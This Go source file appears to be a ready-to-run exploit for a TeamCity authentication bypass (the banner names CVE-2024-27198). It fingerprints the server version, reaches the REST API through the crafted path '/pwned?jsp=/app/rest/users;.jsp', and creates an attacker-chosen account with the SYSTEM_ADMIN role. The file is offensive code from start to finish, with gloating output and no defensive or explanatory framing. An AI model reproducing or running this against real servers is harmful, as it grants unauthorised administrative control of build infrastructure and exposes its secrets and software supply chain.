package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
)

var (
	targetURL  = flag.String("s", "", "TeamCity Server")
	username   = flag.String("u", "", "New admin username")
	password   = flag.String("p", "", "New admin password")
	proxyURL   = flag.String("proxy", "", "Proxy URL (optional)")
	httpClient *http.Client
)

const (
	vulnerableEndpoint = "/pwned?jsp=/app/rest/users;.jsp"
)

func printBanner() {
	banner := `
 ██████ ██    ██ ███████       ██████   ██████  ██████  ██   ██       ██████  ███████  ██  █████   █████  
██      ██    ██ ██                 ██ ██  ████      ██ ██   ██            ██      ██ ███ ██   ██ ██   ██ 
██      ██    ██ █████   █████  █████  ██ ██ ██  █████  ███████ █████  █████      ██   ██  ██████  █████  
██       ██  ██  ██            ██      ████  ██ ██           ██       ██         ██    ██      ██ ██   ██ 
 ██████   ████   ███████       ███████  ██████  ███████      ██       ███████    ██    ██  █████   █████  
`
	fmt.Println(banner)
}

func checkVersion() {
	response, err := httpClient.Get(*targetURL + "/login.html")
	if err != nil {
		fmt.Println("[!] Err:", err)
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("[!] Err:", err)
		return
	}

	rePattern := regexp.MustCompile(`<span class="greyNote version"><span class="vWord">Version<\/span>\s+(\d+\.\d+\.\d+)`)
	version := rePattern.FindStringSubmatch(string(body))
	if len(version) > 1 {
		fmt.Println("[*] Server Version:", version[1])
	} else {
		fmt.Println("[!] Version not detected!")
	}
}

func exploit() {
	response, err := httpClient.Get(*targetURL + vulnerableEndpoint)
	if err != nil {
		fmt.Println("[!] Err:", err)
		return
	}
	defer response.Body.Close()

	httpCode := response.StatusCode
	if httpCode == http.StatusOK {
		fmt.Println("[*] Server vulnerable >:)", httpCode)

		createUser := map[string]interface{}{
			"username": *username,
			"password": *password,
			"email":    *username + "@pwned.com",
			"roles": map[string]interface{}{
				"role": []map[string]interface{}{
					{"roleId": "SYSTEM_ADMIN", "scope": "g"},
				},
			},
		}

		body, err := json.Marshal(createUser)
		if err != nil {
			fmt.Println("[!] Err:", err)
			return
		}

		headers := map[string]string{"Content-Type": "application/json"}
		req, err := http.NewRequest(http.MethodPost, *targetURL+vulnerableEndpoint, bytes.NewBuffer(body))
		if err != nil {
			fmt.Println("[!] Err:", err)
			return
		}
		for key, value := range headers {
			req.Header.Set(key, value)
		}

		createUserResp, err := httpClient.Do(req)
		if err != nil {
			fmt.Println("[!] Err:", err)
			return
		}
		defer createUserResp.Body.Close()

		if createUserResp.StatusCode == http.StatusOK {
			fmt.Println("[*] New admin user", *username, "was created successfully! Hack the planet!")
		} else {
			fmt.Println("[!] Creation of new admin user was unsuccessful.")
		}

	} else {
		fmt.Println("[*] This server is not vulnerable", httpCode)
	}
}

func main() {
	flag.Parse()

	if *targetURL == "" || *username == "" || *password == "" {
		flag.PrintDefaults()
		return
	}
	printBanner()

	// Setup Proxy if provided
	if *proxyURL != "" {
		proxy, err := url.Parse(*proxyURL)
		if err != nil {
			fmt.Println("[!] Invalid proxy URL:", err)
			return
		}
		httpClient = &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxy),
			},
		}
	} else {
		httpClient = &http.Client{}
	}

	checkVersion()
	exploit()
}
